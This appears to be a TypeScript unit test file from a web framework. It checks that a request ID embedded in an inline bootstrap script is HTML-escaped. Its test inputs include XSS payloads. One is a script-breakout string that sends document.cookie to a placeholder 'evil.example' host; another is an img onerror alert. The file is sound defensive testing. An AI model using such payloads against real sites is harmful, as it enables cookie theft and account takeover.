import { htmlEscapeJsonString } from '../../shared/lib/htmlescape'

describe('bootstrapScriptContent escaping', () => {
  function buildBootstrapScriptContent(requestId: string): string {
    return `self.__next_r=${htmlEscapeJsonString(JSON.stringify(requestId))}`
  }

  it('does not contain a raw </script> closing tag when the request ID is malicious', () => {
    const maliciousId =
      '0</script><script>fetch("https://evil.example/steal?c="+document.cookie)</script>'
    const content = buildBootstrapScriptContent(maliciousId)
    expect(content).not.toContain('</script>')
  })

  it('produces valid JSON that round-trips to the original request ID', () => {
    const maliciousId = '0</script><img src=x onerror=alert(origin)>'
    const content = buildBootstrapScriptContent(maliciousId)
    // Extract the JSON value after `self.__next_r=`
    const jsonPart = content.slice('self.__next_r='.length)
    expect(JSON.parse(jsonPart)).toBe(maliciousId)
  })

  it('does not contain raw angle brackets', () => {
    const id = 'normal-uuid-1234</script>injected'
    const content = buildBootstrapScriptContent(id)
    expect(content).not.toMatch(/<|>/)
  })

  it('leaves a well-formed UUID unchanged in meaning', () => {
    const uuid = 'f47ac10b-58cc-4372-a567-0e02b2c3d479'
    const content = buildBootstrapScriptContent(uuid)
    const jsonPart = content.slice('self.__next_r='.length)
    expect(JSON.parse(jsonPart)).toBe(uuid)
  })
})
